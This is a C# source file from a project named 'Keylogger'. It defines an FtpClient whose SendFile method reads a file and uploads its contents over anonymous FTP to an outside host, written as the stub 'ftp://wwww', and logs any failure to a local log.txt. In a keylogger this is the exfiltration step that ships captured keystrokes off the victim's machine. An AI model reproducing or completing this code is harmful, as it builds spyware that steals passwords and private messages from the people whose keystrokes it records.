using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    public static class FtpClient
    {
        public static void SendFile(string pathFile)
        {
            if (!File.Exists(pathFile))
                return;
            var request =  (FtpWebRequest)WebRequest.Create("ftp://wwww" + Path.GetFileName(pathFile));
            request.Method = WebRequestMethods.Ftp.UploadFile;

            // This example assumes the FTP site uses anonymous logon.  
            request.Credentials = new NetworkCredential("", "");

            // Copy the contents of the file to the request stream. 
            try
            {
                var sourceStream = new StreamReader(pathFile);
                byte[] fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
                sourceStream.Close();
                request.ContentLength = fileContents.Length;


                using (var requestStream = request.GetRequestStream())
                {
                    requestStream.Write(fileContents, 0, fileContents.Length);
                }

                var response = (FtpWebResponse)request.GetResponse();
            }
            catch (Exception e)
            {
                using (var red = new StreamWriter(Application.StartupPath + "/log.txt", true))
                {
                    red.WriteLine(e.Message);
                    red.WriteLine(new string('-', 50));
                }
            }


        }
    }
}
